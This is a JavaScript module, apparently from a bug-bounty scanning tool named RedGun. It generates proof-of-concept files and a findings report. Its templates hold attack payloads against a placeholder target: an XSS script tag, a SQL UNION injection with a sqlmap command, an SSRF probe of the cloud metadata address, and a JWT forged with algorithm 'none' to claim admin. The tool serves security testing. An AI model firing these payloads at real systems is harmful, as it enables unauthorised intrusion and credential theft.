import { writeFileSync, mkdirSync, existsSync } from 'fs';
import { getFindings } from './findings.js';

export function generatePocs(outputDir = './scans/pocs') {
  if (!existsSync(outputDir)) mkdirSync(outputDir, { recursive: true });

  const findings = getFindings().filter(f => f.validated && f.exploitability === 'confirmed');
  const generated = [];

  for (const f of findings) {
    const name = `poc-${f.module.toLowerCase().replace(/\s+/g, '-')}-${Date.now()}`;
    let poc = '';

    if (f.module.toLowerCase().includes('xss')) {
      poc = `# PoC: ${f.title}\n# XSS (Cross-Site Scripting)\n\n## Curl\n\`\`\`bash\ncurl 'TARGET/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E'\n\`\`\`\n\n## Python\n\`\`\`python\nimport requests\nr = requests.get('TARGET', params={'q': '<script>alert(1)</script>'})\nif '<script>alert(1)' in r.text:\n    print('[+] XSS confirmed')\n\`\`\`\n\n## Burp Request\n\`\`\`\nGET /?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1\nHost: TARGET_HOST\n\`\`\`\n`;
    } else if (f.module.toLowerCase().includes('sql')) {
      poc = `# PoC: ${f.title}\n# SQL Injection\n\n## Curl\n\`\`\`bash\ncurl "TARGET/?id=1'+UNION+SELECT+NULL--"\n\`\`\`\n\n## Python\n\`\`\`python\nimport requests\nr = requests.get('TARGET', params={'id': "1' UNION SELECT NULL--"})\nif 'SQL' in r.text or 'syntax' in r.text:\n    print('[+] SQLi confirmed')\n\`\`\`\n\n## sqlmap\n\`\`\`bash\nsqlmap -u 'TARGET/?id=1' --dbs\n\`\`\`\n`;
    } else if (f.module.toLowerCase().includes('ssrf')) {
      poc = `# PoC: ${f.title}\n# SSRF\n\n## Curl\n\`\`\`bash\ncurl 'TARGET/?url=http://169.254.169.254/latest/meta-data/'\n\`\`\`\n\n## Python\n\`\`\`python\nimport requests\nr = requests.get('TARGET', params={'url': 'http://169.254.169.254/latest/meta-data/'})\nif 'iam' in r.text or 'ami-id' in r.text:\n    print('[+] SSRF confirmed')\n\`\`\`\n`;
    } else if (f.module.toLowerCase().includes('jwt')) {
      poc = `# PoC: ${f.title}\n# JWT Attack\n\n## Python\n\`\`\`python\nimport jwt\ntoken = jwt.encode({'sub': 'admin', 'role': 'admin'}, key='', algorithm='none')\nimport requests\nr = requests.get('TARGET/api/me', headers={'Authorization': f'Bearer {token}'})\n\`\`\`\n`;
    } else {
      poc = `# PoC: ${f.title}\n# Severity: ${f.severity} | Confidence: ${f.confidence || 'N/A'}%\n\n## Details\n${f.details || 'No details'}\n\n## Fix\n${f.fix || 'No fix recommendation'}\n\n## Validation Note\n${f.validationNote || 'Not validated'}\n`;
    }

    const filepath = `${outputDir}/${name}.md`;
    writeFileSync(filepath, poc);
    generated.push(filepath);
  }

  return generated;
}

export function generateFullReport(findings, origin) {
  const { calculateScore, getGrade } = require('./score.js');
  const score = calculateScore();
  const confirmed = findings.filter(f => f.validated && f.exploitability === 'confirmed');

  let report = `# RedGun Bug Bounty Report\n\n**Target:** ${origin}\n**Score:** ${score}/100 (${getGrade(score)})\n**Date:** ${new Date().toISOString()}\n**Confirmed findings:** ${confirmed.length}\n\n---\n`;

  for (const f of findings) {
    const badge = f.validated
      ? (f.exploitability === 'confirmed' ? '✓ CONFIRMED' : f.exploitability === 'rejected' ? '✗ REJECTED' : '? INCONCLUSIVE')
      : 'UNVERIFIED';
    report += `\n## [${f.severity}] ${f.module}: ${f.title} ${badge}\n\n`;
    if (f.details) report += `**Details:** ${f.details}\n\n`;
    if (f.fix) report += `**Fix:** ${f.fix}\n\n`;
    if (f.validationNote) report += `**Validation:** ${f.validationNote}\n\n`;
    if (f.confidence) report += `**Confidence:** ${f.confidence}%\n\n`;
  }

  return report;
}
